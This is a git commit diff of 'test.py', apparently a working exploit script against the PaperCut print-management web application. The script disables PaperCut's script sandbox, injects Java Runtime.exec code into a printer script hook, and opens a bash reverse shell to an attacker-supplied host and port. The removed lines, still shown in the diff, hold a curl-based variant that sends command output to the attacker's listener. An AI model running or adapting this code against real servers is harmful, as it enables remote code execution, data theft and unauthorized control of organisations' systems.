07caea16533e927baffd76ccc2b2e4e8b05edc70
leejeeho6661 <67623154+leejeeho6661@users.noreply.github.com>
2025-04-03 13:58:42 +0900

    Update test.py

--- test.py
+++ test.py
@@ -45,9 +45,10 @@ def set_setting(base_url, session, setting, enabled):
     }
     r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
 
-def execute(base_url, session, command_to_inject, lhost, lport):
-    print('[*] Prepparing to execute: {command_to_inject}')
-    payload = f"java.lang.Runtime.getRuntime().exec('{command_to_inject}');"
+def execute_reverse_shell(base_url, session, lhost, lport):
+    print(f'[*] Prepparing to execute reverse shell to {lhost}:{lport}')
+    reverse_shell_payload = f"bash -c 'sh -i>& /dev/tcp/{lhost}/{lport} 0>&1'"
+    payload = f"java.lang.Runtime.getRuntime().exec('{reverse_shell_payload}');"
     headers = {'Origin': f'{base_url}'}
     data = {
         'service': 'page/PrinterList'
@@ -78,69 +79,21 @@ def execute(base_url, session, command_to_inject, lhost, lport):
     }
     r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
     if r.status_code == 200 and 'Saved successfully' in r.text:
-        print(f'[+] Command execution initiated on target.')
-    else:
-        print('[-] Might not have a printer configured. Exploit manually by adding one.')
-
-def execute_and_send_result(base_url, session, command_to_list, lhost, lport):
-    print(f'[*] Executing on target and sending result: {command_to_list}')
-    payload = f"java.lang.Runtime.getRuntime().exec('curl \"http://{lhost}:{lport}?result=$( {command_to_list} )\"');"
-    headers = {'Origin': f'{base_url}'}
-    data = {
-        'service': 'page/PrinterList'
-    }
-    r = session.get(f'{base_url}/app?service=page/PrinterList', data=data, headers=headers, verify=False)
-
-    data = {
-        'service': 'direct/1/PrinterList/selectPrinter',
-        'sp': 'l1001'
-    }
-    r = session.get(f'{base_url}/app?service=direct/1/PrinterList/selectPrinter&sp=l1001', data=data, headers=headers, verify=False)
-
-    data = {
-        'service': 'direct/1/PrinterDetails/printerOptionsTab.tab',
-        'sp': '4'
-    }
-    r = session.get(f'{base_url}/app', data=data, headers=headers, verify=False)
-
-    data = {
-        'service': 'direct/1/PrinterDetails/$PrinterDetailsScript.$Form',
-        'sp': 'S0',
-        'Form0': 'printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1',
-        'printerId': 'l1001',
-        'enablePrintScript': 'on',
-        'scriptBody': "function printJobHook(inputs, actions) {}\r\n" \
-                            f"{payload}",
-        '$Submit$1': 'Apply',
-    }
-    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
-    if r.status_code == 200 and 'Saved successfully' in r.text:
-        print(f'[+] Command execution initiated on target. Check your listener at http://{lhost}:{lport}')
+        print(f'[+] Reverse shell initiated. Check your listener at {lhost}:{lport}')
     else:
         print('[-] Might not have a printer configured. Exploit manually by adding one.')
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument('-u', '--url', help='The URL of the Papercut target application', required=True)
-    parser.add_argument('-c', '--command', help='The command to execute directly', required=False)
-    parser.add_argument('--list_command', help='The command to execute for listing and send result', required=False)
-    parser.add_argument('--lhost', help='Your Kali Linux IP address for receiving results', required=False)
-    parser.add_argument('--lport', type=int, help='Your listening port for receiving results', required=False)
+    parser.add_argument('--lhost', help='Your Kali Linux IP address for the reverse shell', required=True)
+    parser.add_argument('--lport', type=int, help='Your listening port for the reverse shell', required=True)
     args = parser.parse_args()
 
     sess = get_session_id(args.url)
     if sess:
         set_setting(args.url, sess, setting='print-and-device.script.enabled', enabled='Y')
         set_setting(args.url, sess, setting='print.script.sandboxed', enabled='N')
-
-        if args.command and args.lhost and args.lport:
-            execute(args.url, sess, f"{args.command} | curl http://{args.lhost}:{args.lport}", args.lhost, args.lport)
-        elif args.command:
-            execute(args.url, sess, args.command, "", "") # lhost, lport가 없으면 직접 실행만 시도
-        elif args.list_command and args.lhost and args.lport:
-            execute_and_send_result(args.url, sess, args.list_command, args.lhost, args.lport)
-        elif args.list_command and (not args.lhost or not args.lport):
-            print("[-] --lhost and --lport are required when using --list_command")
-
+        execute_reverse_shell(args.url, sess, args.lhost, args.lport)
         set_setting(args.url, sess, setting='print-and-device.script.enabled', enabled='N')
         set_setting(args.url, sess, setting='print.script.sandboxed', enabled='Y')
